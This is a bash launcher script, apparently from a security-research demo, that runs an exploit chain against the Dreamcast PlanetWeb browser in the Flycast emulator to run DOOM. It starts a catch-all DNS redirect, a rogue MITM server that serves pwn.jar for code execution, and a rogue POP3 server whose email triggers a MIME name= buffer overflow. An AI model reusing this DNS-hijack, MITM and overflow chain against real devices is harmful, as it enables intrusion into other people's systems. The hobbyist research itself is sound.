#!/usr/bin/env bash
# start_demo.sh -- bring up the rogue Eden server + DNS redirect, then boot the browser.
#
# The Linux rig used dns_redirect.py on :53 plus an iptables REDIRECT :80 -> :8137,
# because :80 was occupied there. macOS has no iptables, so we just bind :80
# directly -- which, like :53, needs root.
#
#   sudo mac/start_demo.sh splash     # confirm the RCE chain end-to-end
#   sudo mac/start_demo.sh jdoom      # DOOM in the Java VM
#   sudo mac/start_demo.sh stagedoom  # native SH-4 DOOM (the DEF CON demo)
#
# Then, in the emulator: go online in the browser and let it connect.
set -u
CHAIN="${1:-splash}"
HERE="$(cd "$(dirname "$0")" && pwd)"
source "$HERE/env.sh"

if [ "$(id -u)" != "0" ]; then
  echo "!! needs root to bind :53 and :80 -- re-run with sudo" >&2
  exit 1
fi

# Drop back to the invoking user for Flycast (a GUI app should not run as root).
REAL_USER="${SUDO_USER:-$(stat -f%Su /dev/console)}"

cleanup() {
  echo; echo "[*] stopping servers"
  [ -n "${DNS_PID:-}" ]  && kill "$DNS_PID" 2>/dev/null
  [ -n "${EDEN_PID:-}" ] && kill "$EDEN_PID" 2>/dev/null
  [ -n "${MAIL_PID:-}" ] && kill "$MAIL_PID" 2>/dev/null
}
trap cleanup EXIT INT TERM

# Take down any previous run first. Without this, a still-running demo holds :53/:80
# and the new servers die with "OSError: [Errno 48] Address already in use" -- while
# the script carries on and looks like it started. Kill by PID (never `pkill -f` on a
# pattern this script's own cmdline could match).
for name in dns_redirect.py eden_mitm.py mail_poc.py mail_mitm.py; do
  for pid in $(pgrep -f "$name" 2>/dev/null); do
    [ "$pid" = "$$" ] && continue
    kill "$pid" 2>/dev/null && echo "[*] stopped previous $name (pid $pid)"
  done
done
sleep 1
for name in dns_redirect.py eden_mitm.py mail_poc.py mail_mitm.py; do
  for pid in $(pgrep -f "$name" 2>/dev/null); do
    [ "$pid" = "$$" ] && continue
    kill -9 "$pid" 2>/dev/null
  done
done

# The stagedoom chain also needs the rogue POP3 server: Eden stages the payload and
# plants the SH-4 stub, but the actual native code execution comes from opening the
# DOOM-STAGE email (the MIME name= overflow overwrites saved PR with the stub addr).
NEED_MAIL=0
[ "$CHAIN" = "stagedoom" ] && NEED_MAIL=1

# --all so ANY hostname resolves to us, not just *.planetweb.com -- the browser's
# POP3 host is whatever you typed into its mail settings. -u or the log never flushes.
echo "[1/4] DNS: all names -> $HOST_IP"
python3 -u "$POC/dns_redirect.py" "$HOST_IP" --all --bind="$HOST_IP" >/tmp/dns.log 2>&1 &
DNS_PID=$!
sleep 1
head -1 /tmp/dns.log 2>/dev/null

echo "[2/4] Eden MITM on :$EDEN_PORT   chain=$CHAIN"
python3 -u "$POC/eden_mitm.py" --chain "$CHAIN" -p "$EDEN_PORT" >"$EDEN_LOG" 2>&1 &
EDEN_PID=$!
sleep 2
sed -n '1,8p' "$EDEN_LOG"
if grep -q "Address already in use\|Traceback" "$EDEN_LOG" 2>/dev/null || ! kill -0 "$EDEN_PID" 2>/dev/null; then
  echo "!! Eden failed to start on :$EDEN_PORT -- something else still owns the port." >&2
  echo "   Check with: sudo lsof -nP -iTCP:$EDEN_PORT -sTCP:LISTEN" >&2
  exit 1
fi

if [ "$NEED_MAIL" = 1 ]; then
  echo "[3/4] rogue POP3 on :110  (DOOM-STAGE overflow mail)"
  python3 -u "$POC/mail_poc.py" --pop 110 >/tmp/mail.log 2>&1 &
  MAIL_PID=$!
  sleep 2
  grep -aE "name= payload|message bytes|POP3 on" /tmp/mail.log | sed 's/^/    /'
else
  echo "[3/4] (no mail server needed for chain '$CHAIN')"
fi

echo "[4/4] booting the browser"
sudo -u "$REAL_USER" HOST_IP="$HOST_IP" "$HERE/flycast.sh" --clean

cat <<EOF

================================================================
  Now drive the console:
    - take the browser ONLINE (A x3 -> Start -> web browser)
    - watch $EDEN_LOG for [1]..[5]; [5] serving pwn.jar IS code execution
      (a bare "GET /" with Host: dreamcast.planetweb.com is only the portal
       home page resolving to us -- NOT the exploit. Look for [1]..[5].)
    - Eden can take a while to subscribe after you connect. Be patient.
EOF
if [ "$CHAIN" = "stagedoom" ]; then
cat <<EOF

  stagedoom (native SH-4 DOOM) then continues:
    - the staging bar runs in $EDEN_LOG ([CHUNK] doom.bin + WAD, ~3.8 MB)
    - wait for "staged doom=" then "GET /stub.bin"  <-- that is READY
    - ONLY THEN open the "DOOM-STAGE" email in the browser's mail client
      (Command Compass -> Mail -> Check Mail). Opening it early does nothing
      useful: the stub has to be planted at 0x8C29ADE8 first.
    - the browser's POP3 host can be any name -- DNS sends everything here.
EOF
fi
echo "================================================================"
echo "(Ctrl-C here stops DNS + Eden${NEED_MAIL:+ + mail}.)"

tail -f "$EDEN_LOG"
